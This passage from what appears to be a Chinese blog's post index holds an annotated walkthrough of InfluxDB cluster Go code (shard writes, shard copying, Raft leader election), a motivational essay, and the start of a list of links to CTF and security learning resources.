conn.RemoteAddr().String()))\n\t}()\n\tfor {\n\t\t// Read type-length-value.\n\t\ttyp, err := ReadType(conn)     //读取连接的数据类型\n\t\tif err != nil {\n\t\t\tif strings.HasSuffix(err.Error(), \"EOF\") {\n\t\t\t\treturn\n\t\t\t}\n\t\t\ts.Logger.Info(\"unable to read type\", zap.Error(err))\n\t\t\treturn\n\t\t}\n\n\t\t// Delegate message processing by type.\n        //处理不同数据类型\n\t\tswitch typ {\n\t\tcase writeShardRequestMessage:\n\t\t\tbuf, err := ReadLV(conn)\n\t\t\tif err != nil {\n\t\t\t\ts.Logger.Error(\"unable to read length-value\", zap.Error(err))\n\t\t\t\treturn\n\t\t\t}\n\t\t\t//处理写shared请求\n\t\t\tatomic.AddInt64(&s.stats.WriteShardReq, 1)\n\t\t\terr = s.processWriteShardRequest(buf)\n\t\t\tif err != nil {\n\t\t\t\ts.Logger.Info(\"process write shard error\", zap.Error(err))\n\t\t\t}\n            //处理写请求返回\n\t\t\ts.writeShardResponse(conn, err)\n\t\tcase executeStatementRequestMessage:\n\t\t\tbuf, err := ReadLV(conn) // ReadLV reads the length-value from a TLV record.\n\t\t\tif err != nil {\n\t\t\t\ts.Logger.Info(\"unable to read length-value\", zap.Error(err))\n\t\t\t\treturn\n\t\t\t}\n\t\t\t//处理执行\n\t\t\terr = s.processExecuteStatementRequest(buf)\n\t\t\tif err != nil {\n\t\t\t\ts.Logger.Info(\"process execute statement error\", zap.Error(err))\n\t\t\t}\n\t\t\ts.writeShardResponse(conn, err)\n\t\tcase createIteratorRequestMessage:\n\t\t\tatomic.AddInt64(&s.stats.CreateIteratorReq, 1)\n\t\t\ts.processCreateIteratorRequest(conn)  //创建请求的interator\n\t\t\treturn\n\t\tcase fieldDimensionsRequestMessage:\n\t\t\tatomic.AddInt64(&s.stats.FieldDimensionsReq, 1)\n\t\t\ts.processFieldDimensionsRequest(conn)\n\t\t\treturn\n\t\tcase createIteratorCostRequestMessage:\n\t\t\ts.processCreateIteratorCostRequest(conn)\n\t\t\treturn\n\t\tcase mapTypeRequestMessage:\n\t\t\ts.processMapTypeRequest(conn)\n\t\t\treturn\n\t\tcase seriesKeysRequestMessage:\n\t\t\t//s.statMap.Add(seriesKeysReq, 1)\n\t\t\t//atomic.AddInt64(&s.stats.FieldDimensionsReq, 1)\n\t\t\t//s.processSeriesKeysRequest(conn)\n\t\t\treturn\n\t\tcase copyShardRequestMessage:\n\t\t\ts.processCopyShardRequest(conn)   //处理copy shared分片请求\n\t\t\treturn\n\t\tdefault:\n\t\t\ts.Logger.Info(\"cluster service message type not found\", zap.Binary(\"type\", []byte{typ}))\n\t\t}\n\t}\n}\n```\n\nprocessWriteShardRequest函数处理请求写操作，将数据写入shared分片中。\n\n```go\nfunc (s *Service) processWriteShardRequest(buf []byte) error {\n\t// Build request\n\tvar req WriteShardRequest\n\tif err := req.UnmarshalBinary(buf); err != nil {\n\t\treturn err\n\t}\n\n\tpoints := req.Points()\n\tatomic.AddInt64(&s.stats.WriteShardPointsReq, int64(len(points)))\n\terr := s.TSDBStore.WriteToShard(req.ShardID(), points)\n\n\t// We may have received a write for a shard that we don't have locally because the\n\t// sending node may have just created the shard (via the metastore) and the write\n\t// arrived before the local store could create the shard.  In this case, we need\n\t// to check the metastore to determine what database and retention policy this\n\t// shard should reside within.\n\tif err == tsdb.ErrShardNotFound {\n\t\tdb, rp := req.Database(), req.RetentionPolicy()\n\t\tif db == \"\" || rp == \"\" {\n\t\t\ts.Logger.Info(\"drop write request. no database or rentention policy received\", logger.Shard(req.ShardID()))\n\t\t\treturn nil\n\t\t}\n\n\t\terr = s.TSDBStore.CreateShard(req.Database(), req.RetentionPolicy(), req.ShardID(), true)\n\t\tif err != nil {\n\t\t\tatomic.AddInt64(&s.stats.WriteShardFail, 1)\n\t\t\treturn fmt.Errorf(\"create shard %d: %s\", req.ShardID(), err)\n\t\t}\n\n\t\terr = s.TSDBStore.WriteToShard(req.ShardID(), points)\n\t\tif err != nil {\n\t\t\tatomic.AddInt64(&s.stats.WriteShardFail, 1)\n\t\t\treturn fmt.Errorf(\"write shard %d: %s\", req.ShardID(), err)\n\t\t}\n\t}\n\n\tif err != nil {\n\t\tatomic.AddInt64(&s.stats.WriteShardFail, 1)\n\t\treturn fmt.Errorf(\"write shard %d: %s\", req.ShardID(), err)\n\t}\n\n\treturn nil\n}\n```\n\n解析statements请求操作，并执行statement语句：\n\n```go\nfunc (s *Service) processExecuteStatementRequest(buf []byte) error {\n\t// Unmarshal the request.\n\tvar req ExecuteStatementRequest\n\tif err := req.UnmarshalBinary(buf); err != nil {\n\t\treturn err\n\t}\n\n\t// Parse the InfluxQL statement.\n\tstmt, err := influxql.ParseStatement(req.Statement())\n\tif err != nil {\n\t\treturn err\n\t}\n\t//处理不同的删除操作\n\treturn s.executeStatement(stmt, req.Database())\n}\n```\n\nWaitForTask用于同步influxdb节点之间数据\n\n```go\nfunc (t *CopyShardTaskManager) WaitForTask() {\n\tfor {\n\t\tif t.Host == \"\" {\n\t\t\tdataNodes, _ := t.MetaClient.DataNodes()   //获取所有的数据节点\n\t\t\tfor _, nodeInfo := range dataNodes {\n\t\t\t\tif nodeInfo.ID == t.Node.GetDataID() {\n\t\t\t\t\tt.Host = nodeInfo.TCPHost\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tcopyShards := t.MetaClient.CopyShardStatus()   //拷贝需要的shared分片\n\t\ttask := t.findTask(&copyShards)          //寻找task任务\n\t\tif task != nil {\n\t\t\tt.addRuningTask(task)\n\t\t\tgo task.Run()                  //运行同步数据\n\t\t}\n\t\ttime.Sleep(t.IdleSleepSeconds)\n\t}\n}\n```\n\nRun函数运行，task任务执行：\n\n```go\nfunc (tk *CopyShardTask) Run() {\n\tdefer tk.TaskManager.removeRuningTask(tk)   //销毁正在运行的任务\n\n\terr := tk.TaskManager.MetaClient.UpdateCopyShardStatus(tk.ID, meta.CopyShardCopying)  //更新状态\n\tif err != nil {\n\t\ttk.Logger.Warn(\"update copy shard status to copying failed\",\n\t\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\t\tzap.Uint64(\"shardid\", tk.ShardID),\n\t\t\tzap.Error(err))\n\t\treturn\n\t}\n\t//同步数据更新函数\n\terr = tk.doTask()\n\tif err != nil {\n\t\ttk.Logger.Warn(\"do copy shard failed\",\n\t\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\t\tzap.Uint64(\"shardid\", tk.ShardID),\n\t\t\tzap.Error(err))\n\t\t//更新copy shared的状态，如果失败，则任务数据同步失败\n\t\terr = tk.TaskManager.MetaClient.UpdateCopyShardStatus(tk.ID, meta.CopyShardFailed)\n\t\tif err != nil {\n\t\t\ttk.Logger.Warn(\"update copy shard status to 'failed' failed\",\n\t\t\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\t\t\tzap.Uint64(\"shardid\", tk.ShardID),\n\t\t\t\tzap.Error(err))\n\t\t}\n\t\treturn\n\t}\n\t//更新copyshared状态\n\terr = tk.TaskManager.MetaClient.UpdateCopyShardStatus(tk.ID, meta.CopyShardSuccess)\n\tif err != nil {\n\t\ttk.Logger.Warn(\"update copy shard status to success failed\",\n\t\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\t\tzap.Uint64(\"shardid\", tk.ShardID),\n\t\t\tzap.Error(err))\n\t\treturn\n\t}\n\n\ttk.Logger.Info(\"update copy shard status to success\",\n\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\tzap.Uint64(\"shardid\", tk.ShardID))\n\n\treturn\n\n}\n```\n\ndoTask函数执行：\n\n```go\nfunc (tk *CopyShardTask) doTask() (err error) {\n\tnodeIDs := make([]uint64, 1)\n\tnodeIDs[0] = tk.SrcNodeID\n\tconn, err := tk.Dialer.DialNode(nodeIDs)    //获取连接\n\tif err != nil {\n\t\ttk.Logger.Warn(\"dial failed to copy shard\",\n\t\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\t\tzap.Uint64(\"shardid\", tk.ShardID),\n\t\t\tzap.Error(err))\n\t\treturn\n\t}\n\tdefer conn.Close()\n\n\t// Write request.\n\tif err = EncodeTLV(conn, copyShardRequestMessage, &CopyShardRequest{\n\t\tShardID: tk.ShardID,    //编码写请求\n\t}); err != nil {\n\t\ttk.Logger.Warn(\"copy shard request failed\",\n\t\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\t\tzap.Uint64(\"shardid\", tk.ShardID),\n\t\t\tzap.Error(err))\n\t\treturn\n\t}\n\n\t// Read the response.\n\tvar resp CopyShardResponse\n\tif _, err = DecodeTLV(conn, &resp); err != nil {\n\t\ttk.Logger.Warn(\"copy shard response failed\",\n\t\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\t\tzap.Uint64(\"shardid\", tk.ShardID),\n\t\t\tzap.Error(err))\n\t\treturn\n\t}\n\ttk.TotalSize = resp.TotalSize\n\tif storeSD := tk.TaskManager.TSDBStore.Shard(tk.ShardID); storeSD == nil {\n\t\tdatabase, policy, _ := tk.TaskManager.MetaClient.ShardOwner(tk.ShardID)\n\t\tif err = tk.TaskManager.TSDBStore.CreateShard(database, policy, tk.ShardID, false); err != nil {   //创建分片\n\t\t\ttk.Logger.Warn(\"create shard failed\",\n\t\t\t\tzap.String(\"database\", database),\n\t\t\t\tzap.String(\"policy\", policy),\n\t\t\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\t\t\tzap.Uint64(\"shardid\", tk.ShardID),\n\t\t\t\tzap.Error(err))\n\t\t\treturn\n\t\t}\n\t\n\t} else if _, err = os.Stat(storeSD.Path()); os.IsNotExist(err) {\n\t\tif err = tk.TaskManager.TSDBStore.DeleteShard(tk.ShardID); err != nil {\n\t\t\ttk.Logger.Warn(\"delete shard failed\",\n\t\t\t\tzap.String(\"database\", storeSD.Database()),\n\t\t\t\tzap.String(\"policy\", storeSD.RetentionPolicy()),\n\t\t\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\t\t\tzap.Uint64(\"shardid\", tk.ShardID),\n\t\t\t\tzap.Error(err))\n\t\t\treturn\n\t\t}\n\t\tif err = tk.TaskManager.TSDBStore.CreateShard(storeSD.Database(), storeSD.RetentionPolicy(), tk.ShardID, false); err != nil {\n\t\t\ttk.Logger.Warn(\"create shard failed\",\n\t\t\t\tzap.String(\"database\", storeSD.Database()),\n\t\t\t\tzap.String(\"policy\", storeSD.RetentionPolicy()),\n\t\t\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\t\t\tzap.Uint64(\"shardid\", tk.ShardID),\n\t\t\t\tzap.Error(err))\n\t\t\treturn\n\t\t}\n\t}\n\t//新建连接wrapper\n\tconnWrapper := NewConnReaderWrapper(conn, tk)\n\t//恢复shared\n\tif err = tk.TaskManager.TSDBStore.RestoreShard(tk.ShardID, connWrapper); err != nil {\n\t\ttk.Logger.Warn(\"restore shard failed\",\n\t\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\t\tzap.Uint64(\"shardid\", tk.ShardID),\n\t\t\tzap.Error(err))\n\t\treturn\n\t}\n\n\t//conn io.Reader never get io.EOF err while RestoreShard, update here\n    //更新copyshared处理，更新数据的主要过程\n\terr = tk.TaskManager.MetaClient.UpdateCopyShardProgress(tk.ID, tk.TotalSize, connWrapper.TotalReceived)\n\n\tif err != nil {\n\t\ttk.Logger.Warn(\"copy shard process update failed:\",\n\t\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\t\tzap.Uint64(\"shardid\", tk.ShardID),\n\t\t\tzap.Uint64(\"total\", tk.TotalSize),\n\t\t\tzap.Uint64(\"totalReceived\", connWrapper.TotalReceived),\n\t\t\tzap.Error(err))\n\t}\n\t//设置shared可用\n\tif err = tk.TaskManager.TSDBStore.SetShardEnabled(tk.ShardID, true); err != nil {\n\t\ttk.Logger.Warn(\"enable shard failed\",\n\t\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\t\tzap.Uint64(\"shardid\", tk.ShardID),\n\t\t\tzap.Error(err))\n\t\treturn\n\t}\n\t//添加sharedowner节点\n\terr = tk.TaskManager.MetaClient.AddShardOwner(tk.ShardID, tk.TaskManager.Node.GetDataID())\n\tif err != nil {\n\t\ttk.Logger.Warn(\"add shard owner failed\",\n\t\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\t\tzap.Uint64(\"shardid\", tk.ShardID),\n\t\t\tzap.Error(err))\n\t\treturn\n\t}\n\n\ttk.Logger.Info(\"copy shard success\",\n\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\tzap.Uint64(\"shardid\", tk.ShardID))\n\n\treturn\n}\n```\n\n还需要注意的地方就是influxdb中使用raft进行选主操作：\n\n入口函数在启动meta服务的函数中：\n\n```go\n// Open starts the service\nfunc (s *Service) Open() error {\n    \n\ts.Logger.Info(\"Starting meta service\")\n\n\tif s.RaftListener == nil {\n\t\tpanic(\"no raft listener set\")\n\t}\n\n\t// Open listener.\n\tif s.https {\n\t\tcert, err := tls.LoadX509KeyPair(s.cert, s.cert)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\n\t\tlistener, err := tls.Listen(\"tcp\", s.httpAddr, &tls.Config{\n\t\t\tCertificates: []tls.Certificate{cert},\n\t\t})\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\n\t\ts.Logger.Info(\"Listening on HTTPS\", zap.String(\"Addr\", listener.Addr().String()))\n\t\ts.ln = listener\n\t} else {\n\t\tlistener, err := net.Listen(\"tcp\", s.httpAddr)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\n\t\ts.Logger.Info(\"Listening on HTTP\", zap.String(\"Addr\", listener.Addr().String()))\n\t\ts.ln = listener\n\t}\n\n\t// wait for the listeners to start\n\ttimeout := time.Now().Add(raftListenerStartupTimeout)\n\tfor {\n\t\tif s.ln.Addr() != nil && s.RaftListener.Addr() != nil {\n\t\t\tbreak\n\t\t}\n\n\t\tif time.Now().After(timeout) {\n\t\t\treturn fmt.Errorf(\"unable to open without http listener running\")\n\t\t}\n\t\ttime.Sleep(10 * time.Millisecond)\n\t}\n\n\tvar err error\n\tif autoAssignPort(s.httpAddr) {\n\t\ts.httpAddr, err = combineHostAndAssignedPort(s.ln, s.httpAddr)\n\t}\n\tif autoAssignPort(s.raftAddr) {\n\t\ts.raftAddr, err = combineHostAndAssignedPort(s.RaftListener, s.raftAddr)\n\t}\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t// Open the store.  The addresses passed in are remotely accessible.\n\ts.store = newStore(s.config, s.remoteAddr(s.httpAddr), s.remoteAddr(s.raftAddr))\n\ts.store.node = s.Node\n\n\thandler := newHandler(s.config, s)\n\thandler.logger = s.Logger\n\thandler.store = s.store\n\ts.handler = handler\n\n\t// Begin listening for requests in a separate goroutine.\n\t// s.serve should start before open as open needs httpd for peers\n\tgo s.serve()\n\n\tif err := s.store.open(s.RaftListener); err != nil {   //开启raft监听\n\t\treturn err\n\t}\n\n\treturn nil\n}\n```\n\n打开raft:\n\n```go\n// open opens and initializes the raft store.\nfunc (s *store) open(raftln net.Listener) error {\n\ts.logger.Info(\"Using data dir\", zap.String(\"datadir\", s.path))\n\n\tjoinPeers, err := s.filterAddr(s.config.JoinPeers, s.httpAddr)  // 获取所有的peers\n\tif err != nil {\n\t\treturn err\n\t}\n\tjoinPeers = s.config.JoinPeers //所有的joinPeers列表，不是很理解这边过滤有啥用，上面过滤之后，这边又覆盖了？\n\n\tvar initializePeers []string\n\tif len(joinPeers) > 0 {\n\t\tc := NewClient()\n\t\tc.SetMetaServers(joinPeers)\n\t\tc.SetTLS(s.config.HTTPSEnabled)\n\t\tfor {\n\t\t\tpeers := c.peers()\n\t\t\tif !Peers(peers).Contains(s.raftAddr) {\n\t\t\t\tpeers = append(peers, s.raftAddr)\n\t\t\t}\n\t\t\tif len(s.config.JoinPeers)-len(peers) == 0 {\n\t\t\t\tinitializePeers = peers\n\t\t\t\tbreak\n\t\t\t}\n\n\t\t\tif len(peers) > len(s.config.JoinPeers) {\n\t\t\t\ts.logger.Info(fmt.Sprintf(\"waiting for join peers to match config specified. found %v, config specified %v\", peers, s.config.JoinPeers))\n\t\t\t} else {\n\t\t\t\ts.logger.Info(fmt.Sprintf(\"Waiting for %d join peers.  Have %v. Asking nodes: %v\", len(s.config.JoinPeers)-len(peers), peers, joinPeers))\n\t\t\t}\n\t\t\ttime.Sleep(time.Second)\n\t\t}\n\t}\n\n\tif err := s.setOpen(); err != nil {\n\t\treturn err\n\t}\n\n\t// Create the root directory if it doesn't already exist.\n\tif err := os.MkdirAll(s.path, 0777); err != nil {\n\t\treturn fmt.Errorf(\"mkdir all: %s\", err)\n\t}\n\n\t// Open the raft store.\n    // raft选主\n\tif err := s.openRaft(initializePeers, raftln); err != nil {\n\t\treturn fmt.Errorf(\"raft: %s\", err)\n\t}\n\n\tif len(joinPeers) > 0 {\n\t\tc := NewClient()\n\t\tc.SetMetaServers(joinPeers)\n\t\tc.SetTLS(s.config.HTTPSEnabled)\n\t\tif err := c.Open(); err != nil {\n\t\t\treturn err\n\t\t}\n\t\tdefer c.Close()\n\t\t\n\t\tn, err := c.JoinMetaServer(s.httpAddr, s.raftAddr)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t\ts.node.ID = n.ID\n\t\tif err := s.node.Save(); err != nil {\n\t\t\treturn err\n\t\t}\n\n\t}\n\n\t// Wait for a leader to be elected so we know the raft log is loaded\n\t// and up to date\n    //等待选主leader\n\tif err := s.waitForLeader(0); err != nil {\n\t\treturn err\n\t}\n\n\t// Make sure this server is in the list of metanodes\n    // 获取raft的peers\n\tpeers, err := s.raftState.peers()\n\tif err != nil {\n\t\treturn err\n\t}\n\tif len(peers) <= 1 {\n\t\t// we have to loop here because if the hostname has changed\n\t\t// raft will take a little bit to normalize so that this host\n\t\t// will be marked as the leader\n\t\tfor {\n\t\t\terr := s.setMetaNode(s.httpAddr, s.raftAddr)\n\t\t\tif err == nil {\n\t\t\t\tbreak\n\t\t\t}\n\t\t\ttime.Sleep(100 * time.Millisecond)\n\t\t}\n\t}\n\n\treturn nil\n}\n```\n\n函数选主流程：\n\n```go\nfunc (r *raftState) open(s *store, ln net.Listener, initializePeers []string) error {\n\tr.ln = ln\n\tr.closing = make(chan struct{})\n\n\t// Setup raft configuration.\n\tconfig := raft.DefaultConfig()\n\tconfig.LogOutput = ioutil.Discard\n\n\tif r.config.ClusterTracing {\n\t\tconfig.Logger = log.New(os.Stderr, \"[raft]\", log.LstdFlags)\n\t}\n    // 超时\n\tconfig.HeartbeatTimeout = time.Duration(r.config.HeartbeatTimeout)\n\tconfig.ElectionTimeout = time.Duration(r.config.ElectionTimeout)\n\tconfig.LeaderLeaseTimeout = time.Duration(r.config.LeaderLeaseTimeout)\n\tconfig.CommitTimeout = time.Duration(r.config.CommitTimeout)\n\t// Since we actually never call `removePeer` this is safe.\n\t// If in the future we decide to call remove peer we have to re-evaluate how to handle this\n\tconfig.ShutdownOnRemove = false\n\n\t// Build raft layer to multiplex listener.\n    // 构建raft层\n\tr.raftLayer = newRaftLayer(r.addr, r.ln)\n\n\t// Create a transport layer\n    //创建网络传输层\n\tr.transport = raft.NewNetworkTransport(r.raftLayer, 3, 10*time.Second, config.LogOutput)\n\n\t// Create peer storage.\n\tr.peerStore = &peerStore{}\n\n\t// This server is joining the raft cluster for the first time if initializePeers are passed in\n\tif len(initializePeers) > 0 {\n\t\tif err := r.peerStore.SetPeers(initializePeers); err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n\n\tpeers, err := r.peerStore.Peers()\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t// If no peers are set in the config or there is one and we are it, then start as a single server.\n\tif len(initializePeers) <= 1 {\n\t\tconfig.EnableSingleNode = true\n\n\t\t// Ensure we can always become the leader\n\t\tconfig.DisableBootstrapAfterElect = false\n\n\t\t// Make sure our peer address is here.  This happens with either a single node cluster\n\t\t// or a node joining the cluster, as no one else has that information yet.\n\t\tif !raft.PeerContained(peers, r.addr) {\n\t\t\tif err := r.peerStore.SetPeers([]string{r.addr}); err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t}\n\n\t\tpeers = []string{r.addr}\n\t}\n\n\t// Create the log store and stable store.\n    // 创建log存储\n\tstore, err := raftboltdb.NewBoltStore(filepath.Join(r.path, \"raft.db\"))\n\tif err != nil {\n\t\treturn fmt.Errorf(\"new bolt store: %s\", err)\n\t}\n\tr.raftStore = store\n\n\t// Create the snapshot store.\n    // 创建文件快照存储\n\tsnapshots, err := raft.NewFileSnapshotStore(r.path, raftSnapshotsRetained, os.Stderr)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"file snapshot store: %s\", err)\n\t}\n\n\t// Create raft log.\n    // 新建raft\n\tra, err := raft.NewRaft(config, (*storeFSM)(s), store, store, snapshots, r.peerStore, r.transport)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"new raft: %s\", err)\n\t}\n\tr.raft = ra\n\n\tr.wg.Add(1)\n\tgo r.logLeaderChanges()\n\n\treturn nil\n}\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["influxdb"],"categories":["influxdb"]},{"title":"发篇心灵鸡汤","url":"/2020/02/16/心灵鸡汤/","content":"\n## 发篇心灵鸡汤\n\n想要有意义的人生，本身就是很累。成天无所事事，那和死了有什么区别？死亡才是永久的休息，那才是真正的一劳永逸。我们得像那热水里的青蛙，在水中折腾翻滚，保持对生命的热忱。这本是生命本该有的状态。\n\n人生没有永远的伤痛，再深的痛，伤口总会痊愈。人生没有过不去的坎，你不可以坐在坎边等它消失，你只能想办法穿过它。人生，没有永远的爱情，没有结局的感情，总要结束;不能拥有的人，总会忘记。慢慢地，你不会再流泪;慢慢地，一切都过去了……适当的放弃，是人生优雅的转身。\n\n人生需要一种平衡。这方面得到的多了，其他就会失去一些。没有十全十美的人生，也不会有万事如意的生活。谁也不可能把所有的好处都占尽，也不可能倒霉到一无所有。失去的时候，要看看自己得到的；成功的时候，也要想想自己付出的。成败也好，得失也罢，无非相对而言，只在于你如何看待。\n\n人生就像马拉松，获胜的关键不在于瞬间的爆发，而在于途中的坚持。你纵有千百个理由放弃，也要给自己找一个坚持下去的理由。很多时候，成功就是多坚持一分钟，这一分钟不放弃，下一分钟就会有希望。只是我们不知道，这一分钟会在什么时候出现。再苦再累，只要坚持走下去,属于你的风景终会出现。\n\n人生就像骑自行车，想保持平衡就得往前走。人生总是在苦恼中循环往复，挣扎不出；得不到的想得到，得到了又怕失去，总觉得别人得到的比自己得到的多。我们每个人都在挣扎中撰写自己的人生。\n\n人生是一列单向行驶的火车，中途会有许多大大小小的站点停靠，但是永远不售返程车票。在这列火车上，有些事情可以做，有些事情必须做，有些事情可做可不做，有些事情坚决不能做，做与不做的选择，决定了人生的方向；做多做少的差别，决定了人生的高度；做好做坏的结果，决定了人生的质量。\n\n人生如棋，黑与白的交错，生与死的交融；人生如棋，所以有了”闲敲棋子落花灯“的闲适，”长人只消一棋局“的洒脱；人生如棋，这是一种竞争，亦是一种调和，漫漫人生，变换不定，令人也难免举棋不定。棋势无定，棋局难料，以不变应万变，胸有成竹，等闲应对看春秋。\n\n人生像一本厚重的书，扉页是我们的梦想，目录是我们的脚印，内容是我们的精彩，后记是我们的回望。有些书是没有主角的，因为我们忽视了自我;有些书是没有线索的，因为我们迷失了自我；有些书是没有内容的，因为我们埋没了自我。唯有把自己当成主角和主线，我们才能写出属于自己的东西。\n\n人生是一列单向行驶的火车，中途会有许多大大小小的站点停靠，但是永远不售返程车票。在这列火车上，有些事情可以做，有些事情必须做，有些事情可做可不做，有些事情坚决不能做，做与不做的选择，决定了人生的方向；做多做少的差别，决定了人生的高度；做好做坏的结果，决定了人生的质量。\n\n世界没有悲剧和喜剧之分，如果你能从悲剧中走出来，那就是喜剧，如果你沉缅于喜剧之中，那它就是悲剧。如果你只是等待，发生的事情只会是你变老了。人生的意义不在于拿一手好牌，而在于打好一手坏牌。\n\n宠辱不惊来去无意，如此心宁静，优雅随之。只有阳光而无阴影，只有欢乐而无痛苦，那就不是人生。在人生的清醒的时刻，在哀痛和伤心的阴影之下，人们真实的自我最接近。人生就像一杯没有加糖的咖啡，喝起来是苦涩的，回味起来却有久久不会褪去的余香。\n\n欣赏的心情是一种积极的世界观，是一种健康、阳光的心态，是真正的快乐之源。人拥有一颗欣赏之心，世间皆是亮丽的风景；用欣赏的眼睛看自己，才能内心愉悦、心底生花。万事万物，你仰视它就伟大，你欣赏它就可爱。学会欣赏，你便拥有快乐；懂得欣赏，你便懂得生活的真谛。拥有欣赏之心，才有幸福人生。\n\n生命很短暂，别把那些重要的话憋着，会没有时间说的。安静，明白了一个人的时光，人生，总有太多期待一直失望，总有太多梦想一直落空，总有太多言语无人可诉。有些人，深深记住，未必不是幸福；坎坷路途，给身边一份温暖；风雨人生，给自己一个微笑。生活，就是把快乐装在心中，一路向前。\n\n岁月里看的是书，读的却是世界；日子沏的是茶，尝的却是生活。生活就是理解，生活就是面对现实微笑。生活就是越过心灵的障碍，平静心性；生活就是越过障碍，注视将来；生活就是知道自己的价值，自己所能做到的与自己所应该做到的。不要用苛刻的眼神看生活，生活的本身就是百味杂陈，人生就是风雨兼程。\n\n我们常常被一个”争“字所纷扰，争到最后，原本阔大渺远的尘世，只剩下一颗自私的心了。心胸开阔一些；得失看轻一些；为别人多考虑一些，哪怕只是少争一点，把看似要紧的东西淡然地放一放，你会发现，人心会一下子变宽，世界会一下子变大。不争，人生至境！\n\n世界的大小，人生的苦乐，心绪的好坏，全取决于你所处的位置。在这个物欲横流的世界里提升一个位置看世界，给自己的思想提升高度，给自己的灵魂储蓄深度，给自己的知识积累厚度，给自己的心灵增加纯度，才能拥有快乐的生活，站在另一个高度俯视世界，学会在平淡的日子里，享受那一份宁静美丽的人生吧。\n\n生命的历程中，圆满只是憧憬，只是我们内心的愿景。一些事，用心了，尽力了，纵然不是圆满，也是一种美好。一些情，在意了，努力了，即使不是完美，也是一种纯真。人生路上，虽有精彩，但更多的是平淡。人生的路要自己走，事要自己做，我们就是于平凡的生活中，演绎着我们的人生，无怨无悔，继续前行！\n\n人生就是一次感恩之旅，为爱要感恩，为恨也要感恩；感恩朋友，也要感恩对手。爱让你温暖感动，恨令你警策自省；朋友加持你的信心，对手磨练你的坚韧。带着一颗感恩的心行世，你就懂得谦卑恻隐；用一颗感恩的心待人处事，你才有宏大的格局，广阔的胸襟。这个世界不欠你，而你却欠着整个世界。\n\n你若懂得知足，就会感到幸福。幸福不是得到的多，而是计较的少。幸福不是拥有的多，而是抱怨的少。坚强，不是面对悲伤不流一滴泪，而是痛哭过后笑着生活。亲情、友情、爱情，不是得到就是学到。无论爱与被爱，只要懂得、舍得、值得，那便是无憾人生。人生最永恒的幸福是平凡，人生最永远的拥有是珍惜。\n\n人生再多的幸运、再多的不幸，都是曾经，都是过去。一如窗外的雨，淋过，湿过，走了，远了感悟人生。曾经的美好留于心底，曾经的悲伤置于脑后，不恋不恨。过去终是过去，那人，那事，那情，任你留恋，都是云烟。学会忘记，懂得放弃，人生总是从告别中走向明天。\n\n人生越成功越淡然。做人成功以心胸宽广为基础，做事成功以百事能忍为起点。心宽则不计较，能忍则不躁动，不计较，不躁动便是淡然。淡然不是麻木，而是内心的稳健。对于感情，知道聚散都是缘，缘尽即散，惋惜也无益。对于事业，了悟成败都是向前，成则继续，败则完善，不必大喜大悲。淡然，让人生超脱。\n\n人生难得一心静。心静才能心安。心浮气躁之人，做人缺乏和善，做事缺乏耐心，势必会让人生陷入僵局。克制浮躁，唯有静心。静心，需要用理智去稀释狂乱的情感，用豁达去释放囚禁的过去，用坦然去迎接不可预知的未来。让心静下来，你才能读懂自己、看清未来。静心，是一种修炼也是一种修养。\n\n\n\n纪念疫情，纪念远去的日子。谢谢。","tags":["心灵鸡汤"],"categories":["心灵鸡汤"]},{"title":"CTF 学习资料整理","url":"/2020/02/13/ctf资料整理/","content":"\n## CTF 学习资料整理\n\n多个地方转载整理：\n\nphp代码解密[https://zhaoyuanma.com/](https://links.jianshu.com/go?to=https%3A%2F%2Fzhaoyuanma.com%2F)\n Python [https://docs.python.org/zh-cn/3.7/](https://links.jianshu.com/go?to=https%3A%2F%2Fdocs.python.org%2Fzh-cn%2F3.7%2F)\n 渗透师[https://www.shentoushi.top/network](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.shentoushi.top%2Fnetwork)\n DVWA攻略[https://www.freebuf.com/articles/web/119150.html](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.freebuf.com%2Farticles%2Fweb%2F119150.html)\n WEB安全学习笔记\n [https://websec.readthedocs.io/zh/latest/](https://links.jianshu.com/go?to=https%3A%2F%2Fwebsec.readthedocs.io%2Fzh%2Flatest%2F)\n 信息安全书籍[https://www.moondream.cn/?p=851](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.moondream.cn%2F%3Fp%3D851)\n [https://github.com/CHYbeta/Web-Security-Learning/blob/master/README.md#mongodb](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FCHYbeta%2FWeb-Security-Learning%2Fblob%2Fmaster%2FREADME.md%23mongodb)\n\n高持续渗透[https://micropoor.blogspot.com/](https://links.jianshu.com/go?to=https%3A%2F%2Fmicropoor.blogspot.com%2F)\n 安全攻防工具\n [https://www.ms08067.com/tool.html](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.ms08067.com%2Ftool.html)\n 0day银行\n [http://www.0daybank.org/?page_id=2](https://links.jianshu.com/go?to=http%3A%2F%2Fwww.0daybank.org%2F%3Fpage_id%3D2)\n 零日安全论坛\n 